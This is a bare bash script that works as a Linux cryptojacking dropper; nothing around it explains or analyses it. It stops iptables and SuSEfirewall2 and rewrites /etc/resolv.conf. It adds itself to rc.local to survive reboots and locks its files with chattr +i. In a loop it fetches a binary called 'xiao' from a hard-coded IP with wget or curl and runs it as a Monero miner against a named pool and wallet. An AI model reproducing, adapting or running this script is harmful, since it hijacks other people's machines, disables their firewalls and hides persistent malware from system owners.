#!/bin/bash
chmod 777 xiao
chattr 777 haha
/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop
echo 'nameserver 8.8.8.8'> /etc/resolv.conf
grep "nohup ./haha >/dev/null 2>&1 &" /etc/rc.d/rc.local >/dev/null
if [ $? -eq 0 ]; then
chmod 777 xiao
sleep 1
chattr +i haha
else
echo "nohup ./haha >/dev/null 2>&1 &" >> /etc/rc.d/rc.local
chmod +x /etc/rc.d/rc.local
chmod +x haha
chmod 777 xiao
chattr +i haha
fi
while true
do
    ps aux | grep xiao | grep -v grep
    if [ $? -eq 0 ];then
         sleep 10
		 chmod 777 xiao
		 chattr +i xiao
            nohup rm -rf index.html >/dev/null 2>&1 &
	     rm -rf nohup.out
    else
        if [ -f xiao ];then
		chmod 777 xiao
		chattr +i xiao
         nohup ./xiao -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:3333 -u 48pYmKDVHLGRtUsM9owu4B6rH5jcxZ4pARyNE6kb4CpB77aZ6EQQwGzfMBmCphMMzgYnYJqZJpLXXWw5m8UgPdpLTsjBUno -p x >/dev/null 2>&1 &
        else
 wget http://120.27.240.44:8080/xiao ; chmod a+x xiao;chattr +i xiao;nohup ./xiao -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:3333 -u 48pYmKDVHLGRtUsM9owu4B6rH5jcxZ4pARyNE6kb4CpB77aZ6EQQwGzfMBmCphMMzgYnYJqZJpLXXWw5m8UgPdpLTsjBUno -p x >/dev/null 2>&1 &
            if [ -f xiao ];then
		chmod 777 xiao
		chattr +i xiao
         nohup ./xiao -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:3333 -u 48pYmKDVHLGRtUsM9owu4B6rH5jcxZ4pARyNE6kb4CpB77aZ6EQQwGzfMBmCphMMzgYnYJqZJpLXXWw5m8UgPdpLTsjBUno -p x >/dev/null 2>&1 &
	    else
			 curl -O http://120.27.240.44:8080/xiao ; chmod a+x xiao;chattr +i xiao;nohup ./xiao -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:3333 -u 48pYmKDVHLGRtUsM9owu4B6rH5jcxZ4pARyNE6kb4CpB77aZ6EQQwGzfMBmCphMMzgYnYJqZJpLXXWw5m8UgPdpLTsjBUno -p x >/dev/null 2>&1 &
	     rm -rf nohup.out
fi
   fi
       fi
done
